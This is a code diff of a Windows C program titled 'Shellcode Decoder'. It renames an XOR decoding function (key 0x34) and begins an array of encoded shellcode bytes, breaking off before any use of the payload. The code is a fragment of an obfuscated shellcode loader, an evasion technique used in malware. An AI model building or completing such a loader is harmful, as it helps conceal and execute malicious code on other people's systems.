@@ -3,7 +3,7 @@ Title: Shellcode Decoder
 */
 #include <Windows.h>
 
-VOID DecodeXOR(char* data, size_t dataLen) {
+VOID XOR(char* data, size_t dataLen) {
     for (int i = 0; i < dataLen; i++) {
         // We need to reverse operation.
         data[i] ^= 0x34;
@@ -13,7 +13,7 @@ VOID DecodeXOR(char* data, size_t dataLen) {
 }
 
 int main() {
-    // This encoded shellcode was generated with EncodeXOR.py
+    // This encoded shellcode was generated with XOR.py
     unsigned char encodedShellcode[] =
         "\x4b\xff\x36\x53\x47\x5f\x77\xb7\xb7\xb7\xf0\xe0"
         "\xf0\xe7\xe5\xe0\xe1\xff\x80\x65\xdc\xff\x3e\xe5"
